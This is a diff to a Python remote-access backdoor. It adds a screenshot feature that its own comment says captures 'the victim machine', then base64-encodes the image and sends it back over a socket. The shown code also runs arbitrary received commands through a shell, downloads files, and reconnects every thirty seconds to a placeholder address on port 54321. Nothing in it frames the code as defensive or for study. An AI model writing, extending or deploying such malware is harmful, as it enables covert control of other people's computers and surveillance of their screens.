@@ -8,6 +8,8 @@ import os
 import shutil
 import base64
 import requests
+import ctypes
+from mss import mss
 
 #This fun. allows us to recieve large bytes of data
 def relaible_recv():
@@ -31,6 +33,11 @@ def download(url):
 	file_name=getresponse.split('/')[-1]
 	with open(file_name,'wb') as out_file:
 		out_file.write(get_response.content)
+
+#This fun. allows us to capture screenshots of the victim machine
+def screenshot():
+	with mss() as screenshot:
+		screenshot.shot()
 
 #This fun. allows us to recieve commands for execution 
 def shell():
@@ -65,13 +72,15 @@ def shell():
 			except:
 				relaible_send("[-]Failed to download the file")
 
-		elif command[:5]=='start':
+		elif command[:10]=="screenshot":
+			screenshot()
 			try:
-				subprocess.Popen(command[6:], shell=True)
-				relaible_send("[+]Successfully started the program")
+				with open("monitor-1.png","rb") as ss:
+					relaible_send(base64.b64encode(ss.read()))
+				os.remove("monitor-1.png")
 			except:
-				relaible_send("[-]Failure in starting the program")
-				
+				relaible_send("[-]Failed to capture screenshot")
+
 		else:
 			try:
 				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
@@ -87,7 +96,7 @@ def connection():
 	while True:
 		time.sleep(30)
 		try:
-			sock.connect(("<ip addr.>",54321))
+			sock.connect(("<ip addr>",54321)) #Specify the victim's ip address
 			shell()
 		except:
 			connection()
